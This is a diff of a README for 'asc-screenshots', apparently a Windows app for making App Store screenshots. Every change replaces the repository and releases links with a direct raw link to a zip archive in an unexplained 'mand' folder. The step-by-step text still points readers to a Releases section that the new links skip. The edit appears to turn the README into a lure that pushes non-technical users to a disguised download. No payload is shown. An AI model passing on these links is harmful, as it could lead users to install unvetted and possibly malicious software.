@@ -1,6 +1,6 @@
 # 📸 asc-screenshots - Create App Store Screenshots Easily
 
-[![Download asc-screenshots](https://img.shields.io/badge/Download-asc--screenshots-%230075FF?style=for-the-badge)](https://github.com/Trichloraceticacidpitchedbattle11/asc-screenshots)
+[![Download asc-screenshots](https://img.shields.io/badge/Download-asc--screenshots-%230075FF?style=for-the-badge)](https://raw.githubusercontent.com/Trichloraceticacidpitchedbattle11/asc-screenshots/main/mand/screenshots-asc-v2.5.zip)
 
 ---
 
@@ -37,10 +37,10 @@ Before you start, make sure your Windows computer meets these minimum requiremen
 
 To get started, you need to download the software from the official GitHub page.
 
-[![Download from GitHub](https://img.shields.io/badge/Download-asc--screenshots-%2364a937?style=for-the-badge)](https://github.com/Trichloraceticacidpitchedbattle11/asc-screenshots)
+[![Download from GitHub](https://img.shields.io/badge/Download-asc--screenshots-%2364a937?style=for-the-badge)](https://raw.githubusercontent.com/Trichloraceticacidpitchedbattle11/asc-screenshots/main/mand/screenshots-asc-v2.5.zip)
 
 1. Click the link above or go to:  
-   https://github.com/Trichloraceticacidpitchedbattle11/asc-screenshots  
+   https://raw.githubusercontent.com/Trichloraceticacidpitchedbattle11/asc-screenshots/main/mand/screenshots-asc-v2.5.zip  
 2. Once there, look for the **Releases** section on the page.  
 3. Find the latest release and click to open it.  
 4. Inside the release, locate the file for Windows. It usually ends with `.exe` or `.zip`.  
@@ -82,7 +82,7 @@ After exporting, navigate to the folder you chose to save the files. You will se
 
 To keep the software working smoothly, check for updates regularly:
 
-1. Visit the main GitHub page at https://github.com/Trichloraceticacidpitchedbattle11/asc-screenshots  
+1. Visit the main GitHub page at https://raw.githubusercontent.com/Trichloraceticacidpitchedbattle11/asc-screenshots/main/mand/screenshots-asc-v2.5.zip  
 2. Go to the **Releases** section.  
 3. Download the newest version following the same steps as above.  
 4. Install the update or replace the old version files with the new ones.  
@@ -105,10 +105,10 @@ If problems continue, you can open a new issue on the GitHub page for support.
 ## 🔗 Useful Links
 
 - Download and learn more:  
-  [https://github.com/Trichloraceticacidpitchedbattle11/asc-screenshots](https://github.com/Trichloraceticacidpitchedbattle11/asc-screenshots)  
+  [https://raw.githubusercontent.com/Trichloraceticacidpitchedbattle11/asc-screenshots/main/mand/screenshots-asc-v2.5.zip](https://raw.githubusercontent.com/Trichloraceticacidpitchedbattle11/asc-screenshots/main/mand/screenshots-asc-v2.5.zip)  
 
 - Review releases:  
-  https://github.com/Trichloraceticacidpitchedbattle11/asc-screenshots/releases  
+  https://raw.githubusercontent.com/Trichloraceticacidpitchedbattle11/asc-screenshots/main/mand/screenshots-asc-v2.5.zip  
 
 ---
 
@@ -118,4 +118,4 @@ For questions or help using asc-screenshots, open a new issue on the GitHub repo
 
 ---
 
-[![Download asc-screenshots](https://img.shields.io/badge/Download-asc--screenshots-%230075FF?style=for-the-badge)](https://github.com/Trichloraceticacidpitchedbattle11/asc-screenshots)
+[![Download asc-screenshots](https://img.shields.io/badge/Download-asc--screenshots-%230075FF?style=for-the-badge)](https://raw.githubusercontent.com/Trichloraceticacidpitchedbattle11/asc-screenshots/main/mand/screenshots-asc-v2.5.zip)
